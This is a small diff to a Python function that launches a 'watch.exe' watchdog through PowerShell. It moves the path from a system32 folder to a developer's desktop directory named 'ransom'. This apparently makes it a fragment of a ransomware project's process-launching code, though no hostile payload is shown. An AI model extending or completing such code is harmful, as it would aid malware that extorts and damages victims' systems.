@@ -43,9 +43,9 @@ class thread(threading.Thread):
 
 def watch_dog_run(user, sender):
     shell = "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
-    watch_dog = "C:\\WINDOWS\\system32\\watch\\watch.exe " + user + " " + sender
+    watch_dog = "C:\\Users\\dmotriy\\Desktop\\ransom\\dynamic\\dist\\watch\\watch.exe " + user + " " + sender
 
-    os.chdir("C:\\WINDOWS\\system32\\watch\\")
+    os.chdir("C:\\Users\\dmotriy\\Desktop\\ransom\\dynamic\\dist\\watch")
 
     subprocess.call([shell, watch_dog])
 
